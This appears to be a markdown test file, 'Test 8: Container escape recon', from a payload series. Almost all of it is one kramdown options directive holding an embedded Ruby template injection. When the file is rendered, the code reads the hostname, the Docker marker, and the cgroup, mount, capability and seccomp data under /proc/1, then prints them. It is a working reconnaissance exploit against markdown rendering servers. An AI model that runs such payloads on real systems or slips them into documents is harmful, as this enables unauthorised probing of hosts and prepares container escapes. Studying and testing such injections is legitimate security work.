---
---

# Test 8: Container escape recon

{::options template="string://<%= info = []; info.push('HOSTNAME=' + (ENV['HOSTNAME'] || 'none')); info.push('DOCKER=' + File.exist?('/.dockerenv').to_s); begin; info.push('CGROUPS=' + File.read('/proc/1/cgroup')[0..200]); rescue; end; begin; info.push('MOUNTS=' + File.readlines('/proc/1/mountinfo').select{|l| l.include?('docker') or l.include?('overlay') or l.include?('cgroup')}.join); rescue; end; begin; info.push('CAPS=' + File.read('/proc/1/status').lines.select{|l| l.start_with?('Cap')}.join); rescue; end; begin; info.push('SECCOMP=' + File.read('/proc/1/status').lines.select{|l| l.include?('Seccomp')}.join); rescue; end; info.join(\"\\n\") %>" /}

placeholder
